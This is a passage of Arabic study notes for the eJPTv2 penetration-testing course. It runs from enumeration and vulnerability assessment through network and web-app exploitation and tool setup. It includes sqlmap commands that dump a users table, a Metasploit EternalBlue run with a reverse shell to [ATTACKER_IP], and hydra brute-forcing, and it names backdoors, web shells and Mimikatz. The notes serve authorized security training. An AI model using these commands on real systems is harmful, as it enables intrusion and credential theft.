    <h4>4. Protocol Enumeration</h4>
    <p><strong>SNMP Enumeration:</strong></p>
    <pre><code>snmpwalk -v 2c -c public [TARGET_IP]</code></pre>
    <p>
      بروتوكول SNMP لو شغال بـ Community String افتراضي زي <code>public</code> أو <code>private</code>، ممكن
      يسرّبلك معلومات ضخمة عن الجهاز — من نظام التشغيل لحد جداول الـ Routing، وأحيانًا حتى المستخدمين المحليين.
    </p>
    <p><strong>snmp-check</strong> — بديل بواجهة أوضح لـ snmpwalk:</p>
    <pre><code>snmp-check [TARGET_IP] -c public</code></pre>
    <p><strong>NetBIOS Enumeration:</strong></p>
    <pre><code>nbtscan 192.168.1.0/24</code></pre>
    <p><strong>LDAP Enumeration:</strong></p>
    <pre><code>ldapsearch -x -h [TARGET_IP] -b "dc=example,dc=com"</code></pre>
    <p class="dim">
      الـ Enumeration محتاجة صبر واهتمام بالتفاصيل الصغيرة — أكتر ثغرة ممكن تلاقيها بتيجي من حاجة بسيطة زي إعداد
      غلط أو مستخدم ناسي يقفل الـ FTP. القاعدة العملية اللي أتبعها دايمًا: لو فيه بورت مفتوح، جرب كل الـ Enumeration
      الممكنة عليه قبل ما تنتقل للجهاز اللي بعده — رجوعك تاني بعد ساعات ممكن يضيع وقت كبير في إعادة التموضع.
    </p>
  </section>
  <hr class="section-divider">
  <!-- ============ 4. VULN ASSESSMENT ============ -->
  <section class="stage" id="vuln-assessment">
    <h2><span class="num">4</span> تقييم الثغرات (Vulnerability Assessment)</h2>
    <p>
      الـ Vulnerability Assessment أو تقييم الثغرات هو إنك تفحص نظام أو شبكة أو موقع عشان تلاقي نقاط الضعف اللي
      ممكن الهاكر يستغلها — الهدف إنك تلاقيها قبله.
    </p>
    <div class="callout">
      <span class="label">الفرق المهم</span>
      <p>
        بينها وبين Penetration Testing الكامل: الـ VA بيوقف عند "اكتشاف وتوثيق الثغرة"، بينما الـ Pentest بيكمل
        خطوة كمان ويحاول يستغل الثغرة فعليًا عشان يثبت تأثيرها الحقيقي (مش كل ثغرة نظرية قابلة للاستغلال فعليًا).
      </p>
    </div>
    <h3>خطوات التقييم</h3>
    <ol class="plain">
      <li>
        <strong>التخطيط والتحضير:</strong> تحديد نطاق الفحص (سيرفر، شبكة، موقع...)، الاتفاق على الأدوات، والتأكد من
        موافقة صاحب النظام. الفحص ممكن يكون:
        <ul>
          <li><strong>خارجي:</strong> الحاجات اللي أي حد من بره الشبكة يقدر يوصلها (زي Web Servers)</li>
          <li><strong>داخلي:</strong> فحص الأنظمة اللي جوا الشبكة</li>
        </ul>
      </li>
      <li><strong>جمع المعلومات:</strong> الـ IPs الشغالة، أنظمة التشغيل، والخدمات (FTP، HTTP...)</li>
      <li><strong>الفحص:</strong> على مستوى الشبكة، الأنظمة، والتطبيقات (SQL Injection، XSS، إلخ)</li>
      <li>
        <strong>تحليل النتائج:</strong> تقييم خطورة كل ثغرة وتأثيرها المحتمل — هنا عادةً بيتم استخدام معيار
        <strong>CVSS</strong> (Common Vulnerability Scoring System) لإدي كل ثغرة رقم من 0 لـ 10 بناءً على خطورتها
        الفعلية، مش مجرد وصف عام
      </li>
      <li><strong>كتابة التقرير:</strong> توثيق الثغرات وخطورتها وطرق إصلاحها</li>
      <li><strong>المتابعة (Remediation &amp; Re-Assessment):</strong> التأكد إن الثغرات اتقفلت فعلًا بعد الإصلاح</li>
    </ol>
    <h3>أهم الأدوات</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الأداة</th><th>الاستخدام</th></tr></thead>
        <tbody>
          <tr><td>Nessus</td><td>فحص شامل للشبكة والأنظمة والبرامج مع تقرير مفصل</td></tr>
          <tr><td>OpenVAS</td><td>نفس فكرة Nessus لكن مفتوحة المصدر</td></tr>
          <tr><td>QualysGuard</td><td>خدمة سحابية لفحص الأنظمة والشبكات</td></tr>
          <tr><td>Nikto</td><td>فحص مواقع الويب عن الثغرات والإعدادات الخاطئة</td></tr>
          <tr><td>Burp Suite</td><td>اختبار تطبيقات الويب (SQL Injection، XSS، إلخ)</td></tr>
          <tr><td>Nexpose (InsightVM)</td><td>من أدوات Rapid7، بتتكامل بسهولة مع Metasploit لنقل نتايج الفحص مباشرة لمرحلة الاستغلال</td></tr>
          <tr><td>Nuclei</td><td>أداة حديثة وسريعة جدًا بتعتمد على Templates جاهزة لفحص آلاف الثغرات المعروفة (CVEs) في وقت قصير</td></tr>
        </tbody>
      </table>
    </div>
    <h3>خطوات فحص شامل سريع</h3>
    <pre><code># 1. ابدأ بـ Nmap لمعرفة المنافذ والخدمات
nmap -sV -sC -oN scan_results.txt [TARGET_IP]</code></pre>
    <p>بعدها:</p>
    <ul>
      <li>استخدم Nessus أو OpenVAS لفحص شامل على الـ IPs اللي جمعتها</li>
      <li>استخدم Burp Suite أو Nikto لو فيه تطبيق ويب</li>
      <li>حلل النتائج واكتب التقرير</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        فحصت جهاز بـ Nessus ولقيت النتيجة بتقول إن نسخة SMB القديمة الشغالة على الجهاز عرضة لـ MS17-010
        (EternalBlue)، ودرجة الخطورة CVSS تسجل 9.8 من 10. الخطوة المنطقية بعد كده مش إنك تصلح المشكلة بنفسك، لكن
        توثقها في تقييمك وتوضح إن الثغرة دي بتسمح بتنفيذ أوامر عن بعد بدون أي مصادقة — وده اللي بيخلي أولويتها
        Critical.
      </p>
    </div>
    <h3>نصائح</h3>
    <ul>
      <li>حافظ على تحديث الأدوات باستمرار — الأدوات القديمة ممكن ماتكتشفش الثغرات الجديدة</li>
      <li>راجع النتائج بنفسك دايمًا، الأدوات مش دايمًا دقيقة 100% — ممكن تطلع False Positives</li>
      <li>بلّغ الفريق فورًا بأي ثغرة حرجة (Critical) بمجرد اكتشافها، مش لما تخلص الفحص بالكامل</li>
      <li>تابع الثغرات الجديدة اللي بتظهر باستمرار (نشرات CVE يوميًا)</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 5. NETWORK AUDITING ============ -->
  <section class="stage" id="network-auditing">
    <h2><span class="num">5</span> تدقيق الشبكات (Network Auditing)</h2>
    <p>
      تدقيق الشبكات هو فحص وتحليل الشبكة بالكامل عشان تعرف الأجهزة الموجودة، الخدمات الشغالة، إعدادات الشبكة،
      الثغرات الأمنية، وأي أخطاء ممكن تأثر على الأداء أو الأمان.
    </p>
    <div class="callout">
      <span class="label">الفرق عن الـ Pentest</span>
      <p>
        بخلاف الـ Pentest اللي بيركز على "هل ممكن أخترق؟"، الـ Network Auditing بيركز أكتر على "هل الإعدادات دي
        متوافقة مع أفضل الممارسات الأمنية؟"
      </p>
    </div>
    <h3>ليه بنعمل Network Auditing؟</h3>
    <ul>
      <li><strong>تحسين الأمان:</strong> اكتشاف الثغرات وسدها</li>
      <li><strong>تحسين الأداء:</strong> كشف المشاكل اللي بتأثر على سرعة الشبكة</li>
      <li><strong>الامتثال (Compliance):</strong> التأكد من التوافق مع معايير زي PCI-DSS وISO</li>
      <li><strong>الكشف عن الأخطاء:</strong> اكتشاف الأخطاء في الإعدادات قبل ما تسبب مشاكل كبيرة</li>
    </ul>
    <h3>خطوات التدقيق</h3>
    <ol class="plain">
      <li>
        <strong>جمع المعلومات الأولية:</strong> عمل Inventory لكل الأجهزة المتصلة (Routers, Switches, Servers, Workstations)
        <pre><code>nmap -sV -oN network_scan.txt [IP Range]</code></pre>
      </li>
      <li><strong>فحص الأجهزة والخدمات:</strong> التأكد من إن المنافذ المفتوحة هي المطلوبة فقط — مثلًا لو لقيت Telnet شغال على راوتر، ده Red Flag فورًا لأنه بروتوكول غير مشفر</li>
      <li><strong>مراجعة إعدادات الشبكة:</strong> ACLs، VLANs، إعدادات الـ Routing، وتقسيم الشبكة (Segmentation) — شبكة من غير Segmentation معناها لو جهاز واحد اتخترق، المهاجم يقدر يوصل لكل حاجة تانية بسهولة</li>
      <li><strong>تحليل حركة المرور:</strong> باستخدام Wireshark لرصد أي بيانات أو اتصالات غير طبيعية، زي بيانات بتتنقل بدون تشفير أو اتصالات لجهات خارجية مشبوهة</li>
      <li><strong>فحص الأمان:</strong> كلمات مرور ضعيفة/افتراضية، بروتوكولات غير آمنة (FTP، Telnet)، أنظمة قديمة — باستخدام Nessus/OpenVAS وHydra/Medusa</li>
      <li><strong>فحص الـ Firewall والـ IDS/IPS:</strong> التأكد من فعاليتها في منع ورصد الاتصالات المشبوهة</li>
      <li><strong>تحليل السجلات (Logs):</strong> مراجعة سجلات الـ Routers والـ Firewalls والـ Servers لرصد محاولات دخول فاشلة</li>
      <li><strong>اختبار الإعدادات السيئة:</strong> تجربة كلمات مرور افتراضية، محاولة الوصول لموارد بدون صلاحيات، التأكد من عدم استخدام SNMP Public Community Strings</li>
      <li><strong>كتابة التقرير:</strong> توثيق الثغرات والمشاكل والتوصيات</li>
      <li><strong>المتابعة:</strong> إعادة التدقيق بعد الإصلاح للتأكد من إغلاق الثغرات</li>
    </ol>
    <h3>أدوات مهمة</h3>
    <ul>
      <li><strong>Nmap:</strong> فحص الأجهزة والخدمات في الشبكة</li>
      <li><strong>Wireshark:</strong> مراقبة وتحليل حركة المرور</li>
      <li><strong>Nessus / OpenVAS:</strong> فحص الثغرات</li>
      <li><strong>SolarWinds Network Performance Monitor:</strong> مراقبة أداء الشبكة</li>
      <li><strong>Splunk / ELK Stack:</strong> تحليل السجلات</li>
      <li><strong>PRTG Network Monitor:</strong> لمراقبة حالة الأجهزة والخدمات باستمرار وإرسال تنبيهات لحظية عند حدوث مشكلة</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        أثناء تدقيق شبكة شركة صغيرة، لاحظت إن كل الأجهزة على نفس الـ VLAN — يعني جهاز الموظفين العادي على نفس شبكة
        سيرفرات المحاسبة. حتى لو محدش استغل ده فعليًا، ده بحد ذاته "ثغرة تصميمية" لازم تتسجل في التقرير كـ Finding،
        لأنها بتوسع دائرة الخطر لو أي جهاز عادي اتخترق.
      </p>
    </div>
    <h3>نصائح</h3>
    <ul>
      <li>راجع كل جهاز وكل خدمة، حتى لو باين إنها مش مهمة</li>
      <li>استخدم الأدوات المناسبة لحجم وتعقيد الشبكة</li>
      <li>أغلب الثغرات بتيجي من إعدادات غلط — راجعها كويس</li>
      <li>حلل حركة المرور وتأكد إنها طبيعية</li>
      <li>ابقى محدث بالثغرات الجديدة دايمًا</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 6. NETWORK PENTEST ============ -->
  <section class="stage" id="network-pentest">
    <h2><span class="num">6</span> اختبار اختراق الشبكات (Network Penetration Testing)</h2>
    <p>
      هنا بتمثل دور الهاكر فعليًا وتحاول تخترق شبكة معينة عشان تكتشف الثغرات ونقاط الضعف فيها قبل ما حد تاني يكتشفها
      ويستغلها.
    </p>
    <h3>الخطوات</h3>
    <h4>1. التخطيط والموافقة</h4>
    <p>خد إذن رسمي من صاحب الشبكة يوضح نطاق الفحص والأدوات المسموح استخدامها — ده بيحميك قانونيًا.</p>
    <h4>2. جمع المعلومات</h4>
    <p>الأجهزة الموجودة، الـ IP Range، وأنظمة التشغيل الشغالة.</p>
    <pre><code>nmap -sn [IP Range]</code></pre>
    <p>بالإضافة لـ WHOIS وNSLookup لمعرفة معلومات الدومين والـ IP.</p>
    <h4>3. الفحص</h4>
    <ul>
      <li>Port Scanning بـ Nmap</li>
      <li>Service Enumeration لمعرفة الخدمات الشغالة على كل منفذ</li>
    </ul>
    <h4>4. Enumeration</h4>
    <ul>
      <li><strong>enum4linux:</strong> لاستخراج معلومات SMB</li>
      <li><strong>SNMPwalk:</strong> لسحب البيانات من الأجهزة اللي شغالة عليها SNMP</li>
      <li><strong>rpcclient:</strong> لجلب معلومات RPC Services</li>
    </ul>
    <h4>5. Vulnerability Assessment</h4>
    <p>فحص شامل بـ Nessus أو OpenVAS لاكتشاف الأنظمة غير المحدثة، البروتوكولات القديمة، وكلمات المرور الضعيفة.</p>
    <h4>6. Exploitation</h4>
    <p>استغلال الثغرات المكتشفة فعليًا، على سبيل المثال:</p>
    <ul>
      <li>لو فيه ثغرة SMB → Metasploit</li>
      <li>لو فيه SSH مفتوح → محاولة Brute-force</li>
    </ul>
    <ul>
      <li><strong>Metasploit Framework:</strong> فيه Exploits جاهزة للاستخدام المباشر</li>
      <li><strong>Hydra / Medusa:</strong> لهجمات الـ Brute-force</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي متكامل</span>
      <p>
        فحصت جهاز Windows Server ولقيت المنفذ 445 مفتوح بنسخة SMB قديمة. أكدت الثغرة بـ Nessus، ولقيتها فعلًا
        MS17-010. فتحت Metasploit:
      </p>
      <pre><code>use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [TARGET_IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER_IP]
exploit</code></pre>
      <p>
        ولو نجح الاستغلال، هتلاقي نفسك جوا Meterpreter Session بصلاحيات SYSTEM مباشرة — لأن الثغرة دي من نوع
        Remote Code Execution بدون مصادقة.
      </p>
    </div>
    <h4>7. Maintaining Access</h4>
    <p>تثبيت الوجود على الجهاز بعد الدخول — زي إنشاء Backdoor بـ Netcat أو رفع Web Shell.</p>
    <h4>8. Privilege Escalation</h4>
    <p>
      رفع الصلاحيات من مستخدم عادي لـ Admin، باستخدام أدوات زي Linux Exploit Suggester أو Windows Exploit
      Suggester — الفكرة هنا إنك بتجمع معلومات عن الكيرنل والتحديثات المثبتة، وبتقارنها بقاعدة بيانات ثغرات معروفة
      لرفع الصلاحيات.
    </p>
    <h4>9. Pivoting</h4>
    <p>
      التحرك من جهاز لجهاز جوا نفس الشبكة باستخدام الجهاز المخترق كبوابة، عبر أدوات زي Chisel أو Proxychains. مفيدة
      جدًا لما تكتشف إن الجهاز اللي اخترقته عنده كارت شبكة تاني متصل بشبكة داخلية تانية إنت أصلًا مش قادر توصلها
      مباشرة.
    </p>
    <h4>10. Post-Exploitation</h4>
    <p>
      سحب أي معلومات حساسة — ملفات، Passwords، بيانات مهمة. أدوات زي Mimikatz بتستخدم هنا لسحب كلمات المرور المخزنة
      في الذاكرة على أنظمة Windows.
    </p>
    <h4>11. Covering Tracks &amp; Reporting</h4>
    <p>
      مسح أي أثر يدل على تواجدك على النظام، وكتابة تقرير شامل بكل الثغرات اللي اتكشفت واتستغلت وطرق إصلاحها.
    </p>
    <div class="callout warning">
      <span class="label">ملحوظة مهمة</span>
      <p>
        في اختبارات الاختراق الاحترافية غالبًا الـ RoE بتطلب منك إنك متمسحش آثارك بالكامل، عشان فريق الـ Blue Team
        يقدر يتمرن على اكتشافها كجزء من التمرين.
      </p>
    </div>
    <h3>الأدوات المستخدمة</h3>
    <ul>
      <li><strong>Nmap:</strong> فحص الشبكة والمنافذ</li>
      <li><strong>Metasploit Framework:</strong> استغلال الثغرات</li>
      <li><strong>Burp Suite:</strong> اختبار تطبيقات الويب</li>
      <li><strong>Hydra / Medusa:</strong> هجمات Brute-force</li>
      <li><strong>Wireshark:</strong> تحليل الشبكة</li>
      <li><strong>CrackMapExec:</strong> أداة ممتازة للتحقق السريع من صلاحية بيانات اعتماد على مجموعة أجهزة كاملة في أمر واحد، ومفيدة جدًا في بيئات Active Directory</li>
      <li><strong>BloodHound:</strong> لرسم العلاقات بين المستخدمين والجروبات والأجهزة في بيئة Active Directory بصريًا، وبيوريك أقصر مسار من مستخدم عادي لصلاحيات Domain Admin</li>
    </ul>
    <h3>نصائح مهمة</h3>
    <ul>
      <li>خد إذن رسمي أول أي حاجة — الشغل لازم يكون قانوني</li>
      <li>ابدأ دايمًا بجمع المعلومات كفاية قبل أي خطوة تانية</li>
      <li>اختار الأداة المناسبة لكل موقف، مش كل أداة تنفع في كل هجوم</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 7. WEBAPP PENTEST ============ -->
  <section class="stage" id="webapp-pentest">
    <h2><span class="num">7</span> اختبار اختراق تطبيقات الويب (Web Application Penetration Testing)</h2>
    <p>
      هنا بتحاكي دور الهاكر لاكتشاف الثغرات في تطبيقات الويب — الهدف حماية التطبيق من أي هجوم محتمل ومساعدة
      المطورين في تحسين الأمان.
    </p>
    <h3>الخطوات</h3>
    <h4>1. التخطيط والموافقة</h4>
    <p>زي اختبار الشبكات بالظبط — إذن رسمي من أصحاب التطبيق، وتحديد حدود الفحص بدقة.</p>
    <h4>2. جمع المعلومات</h4>
    <p>فهم هيكل التطبيق، وظائفه، وطريقة تفاعل المستخدمين معاه.</p>
    <ul>
      <li><strong>WHOIS:</strong> معلومات الدومين</li>
      <li><strong>NSLookup:</strong> سجلات DNS</li>
      <li><strong>Google Dorking:</strong> للوصول لمعلومات حساسة عن التطبيق</li>
    </ul>
    <h4>3. فحص التطبيق</h4>
    <ul>
      <li><strong>OWASP ZAP:</strong> أداة مفتوحة المصدر لفحص تطبيقات الويب</li>
      <li><strong>Burp Suite:</strong> من أشهر أدوات فحص تطبيقات الويب</li>
      <li><strong>Wappalyzer:</strong> إضافة متصفح بتكشفلك التقنيات المستخدمة في بناء الموقع (لغة البرمجة، الـ CMS، المكتبات الأمامية) في ثواني</li>
    </ul>
    <h4>4. Enumeration</h4>
    <p>استخراج نقاط الدخول في التطبيق — نماذج التسجيل، API endpoints، وكل مكون ممكن يتم استغلاله.</p>
    <ul>
      <li><strong>Burp Suite:</strong> لتعديل الطلبات والاستجابات</li>
      <li><strong>Postman:</strong> لتجربة الـ APIs</li>
      <li>
        <strong>Gobuster / Wfuzz:</strong> لاكتشاف الصفحات والمسارات المخفية اللي مش ظاهرة في القائمة الرئيسية للموقع:
        <pre><code>wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://example.com/FUZZ</code></pre>
      </li>
    </ul>
    <h4>5. Vulnerability Assessment</h4>
    <p>البحث عن أنواع ثغرات محددة:</p>
    <ul>
      <li><strong>SQL Injection:</strong> حقن استعلامات ضارة في قواعد البيانات</li>
      <li><strong>Cross-Site Scripting (XSS):</strong> حقن سكريبتات ضارة في صفحات الويب</li>
      <li><strong>Cross-Site Request Forgery (CSRF):</strong> إجبار المستخدم على تنفيذ إجراءات غير مرغوبة</li>
      <li><strong>Insecure Direct Object References (IDOR):</strong> الوصول غير المصرح به للموارد</li>
      <li><strong>File Upload Vulnerabilities:</strong> رفع ملفات ضارة (زي Web Shell) لو التطبيق مش بيتحقق كويس من نوع الملف المرفوع</li>
      <li><strong>Local/Remote File Inclusion (LFI/RFI):</strong> تضمين ملفات من السيرفر نفسه أو من مصدر خارجي، وده ممكن يوصل لتنفيذ أوامر</li>
    </ul>
    <h4>6. Exploitation</h4>
    <ul>
      <li><strong>SQLMap:</strong> لتسهيل استغلال ثغرات SQL Injection</li>
      <li><strong>XSSer:</strong> لاكتشاف واستغلال ثغرات XSS</li>
    </ul>
    <div class="callout example">
      <span class="label">مثال عملي</span>
      <p>
        لاقيت باراميتر <code>?id=1</code> في رابط الموقع بيرجع بيانات مختلفة حسب الرقم. جربت <code>?id=1'</code>
        ورجعلي Error من قاعدة البيانات — ده مؤشر قوي على SQL Injection. أكدت الثغرة وبعدين استخدمت SQLMap لأتمتة
        عملية الاستخراج:
      </p>
      <pre><code>sqlmap -u "http://example.com/vuln.php?id=1" --dbs
sqlmap -u "http://example.com/vuln.php?id=1" -D webapp_db --tables
sqlmap -u "http://example.com/vuln.php?id=1" -D webapp_db -T users --dump</code></pre>
      <p>
        الخطوات دي بترجع أسماء قواعد البيانات، بعدها الجداول، وفي الآخر البيانات نفسها (زي جدول المستخدمين وكلمات
        مرورهم المشفرة).
      </p>
    </div>
    <h4>7. Privilege Escalation</h4>
    <p>
      رفع الصلاحيات لو دخلت بحساب محدود، عن طريق البحث عن نقاط ضعف إضافية في التطبيق — زي تعديل قيمة Cookie أو
      Parameter بيحدد دور المستخدم (<code>role=user → role=admin</code>).
    </p>
    <h4>8. Maintaining Access</h4>
    <p>تثبيت طريقة دخول ثانية بعد الاختراق — زي رفع Shell على السيرفر.</p>
    <h4>9. Post-Exploitation</h4>
    <p>جمع معلومات إضافية عن التطبيق وقواعد البيانات، باستخدام Burp Suite أو Metasploit.</p>
    <h4>10. Covering Tracks &amp; Reporting</h4>
    <p>مسح أي أثر، وكتابة تقرير شامل بالثغرات وطرق استغلالها والتوصيات لإصلاحها.</p>
    <h3>أدوات أساسية</h3>
    <div class="table-wrap">
      <table>
        <thead><tr><th>الأداة</th><th>الاستخدام</th></tr></thead>
        <tbody>
          <tr><td>Burp Suite</td><td>فحص شامل لتطبيقات الويب بموديولات متعددة</td></tr>
          <tr><td>OWASP ZAP</td><td>فحص تطبيقات الويب، مفتوح المصدر وسهل الاستخدام</td></tr>
          <tr><td>SQLMap</td><td>استغلال ثغرات SQL Injection</td></tr>
          <tr><td>Nikto</td><td>فحص الخوادم عن الثغرات المعروفة</td></tr>
          <tr><td>Postman</td><td>اختبار الـ APIs والـ Requests/Responses</td></tr>
          <tr><td>Wappalyzer</td><td>كشف التقنيات المستخدمة في بناء الموقع</td></tr>
          <tr><td>Gobuster / Wfuzz</td><td>اكتشاف الصفحات والمسارات المخفية</td></tr>
        </tbody>
      </table>
    </div>
    <h3>نصائح مهمة</h3>
    <ul>
      <li>خد إذن رسمي من صاحب التطبيق قبل البدء</li>
      <li>اجمع معلومات كفاية قبل أي محاولة هجوم</li>
      <li>اختار الأداة المناسبة لنوع الثغرة اللي بتدور عليها</li>
      <li>راجع الـ OWASP Top 10 بشكل دوري — بتلخصلك أخطر عشر فئات ثغرات في تطبيقات الويب، ومعظم اللي هتقابله في الامتحان أو في الشغل الحقيقي بيقع تحت واحدة منهم</li>
    </ul>
  </section>
  <hr class="section-divider">
  <!-- ============ 8. TOOLS INSTALL ============ -->
  <section class="stage" id="tools-install">
    <h2><span class="num">8</span> تثبيت الأدوات الأساسية للكورس</h2>
    <p>مرجع سريع لتثبيت واستخدام أهم الأدوات اللي هتحتاجها في الكورس ده:</p>
    <h4>Nmap</h4>
    <pre><code># على كالي لينكس: موجودة بشكل افتراضي
nmap -sS [TARGET_IP]</code></pre>
    <h4>Burp Suite</h4>
    <p>نزّل النسخة المجانية (Community Edition) من الموقع الرسمي، افتح البرنامج وابدأ من Intruder أو Scanner، وضيف البروكسي بتاعه في المتصفح.</p>
    <h4>OWASP ZAP</h4>
    <p>نزّل النسخة المناسبة لنظامك، افتح البرنامج واستخدم Quick Start لفحص أي تطبيق ويب، وضيف البروكسي في المتصفح.</p>
    <h4>SQLMap</h4>
    <pre><code># على كالي لينكس
sudo apt install sqlmap</code></pre>
    <pre><code>python sqlmap.py -u "http://example.com/vuln.php?id=1" --dbs</code></pre>
    <h4>Nikto</h4>
    <pre><code># على كالي لينكس
sudo apt install nikto</code></pre>
    <pre><code>perl nikto.pl -h http://example.com</code></pre>
    <h4>Metasploit Framework</h4>
    <pre><code># موجودة جاهزة على كالي لينكس
msfconsole</code></pre>
    <pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
    <h4>Hydra</h4>
    <pre><code># على كالي لينكس
sudo apt install hydra</code></pre>
    <pre><code>hydra -l username -P passwords.txt ftp://target_ip</code></pre>
    <h4>Wireshark</h4>
    <pre><code># على كالي لينكس
sudo apt install wireshark</code></pre>
    <p>افتح البرنامج، اختار واجهة الشبكة، وابدأ التقاط البيانات.</p>
    <h4>Postman</h4>
    <p>نزّل النسخة المناسبة من الموقع الرسمي، استخدمه لاختبار الـ APIs عن طريق إدخال الـ URL وتجربة الـ Requests المختلفة.</p>
    <h4>Gobuster</h4>
    <pre><code># على كالي لينكس
sudo apt install gobuster</code></pre>
    <pre><code>gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt</code></pre>
    <h4>CrackMapExec</h4>
    <pre><code>pip3 install crackmapexec</code></pre>
    <pre><code>crackmapexec smb 192.168.1.0/24 -u username -p password</code></pre>
    <h4>BloodHound</h4>
    <pre><code>sudo apt install bloodhound</code></pre>
    <p>
      بعد التثبيت، بتحتاج تشغّل SharpHound (Collector) على بيئة الـ Active Directory الهدف لجمع البيانات، بعدين
      تستوردها في واجهة BloodHound الرسومية عشان تشوف العلاقات والمسارات بين الحسابات.
    </p>
  </section>
  <hr class="section-divider">
  <section class="stage" style="margin-bottom: 0;">
    <h2 style="border-bottom:none; margin-bottom:12px;">الخلاصة</h2>
    <p>
      كدا غطينا كل أجزاء الكورس بالتفصيل — من أول Engagement لحد كتابة التقرير النهائي، مرورًا بكل مرحلة من مراحل
      جمع المعلومات، الفحص، الـ Enumeration، تقييم الثغرات، تدقيق الشبكات، واختبار اختراق الشبكات وتطبيقات الويب.
    </p>
  </section>
  <footer>
    <div>نوتس eJPTv2 — للمراجعة والاستخدام الشخصي فقط، استخدم كل الأدوات المذكورة داخل نطاق قانوني ومصرّح به فقط.</div>
    <a class="back-to-top" href="#top">⬆ رجوع لأعلى الصفحة</a>
  </footer>
</div>
</div>
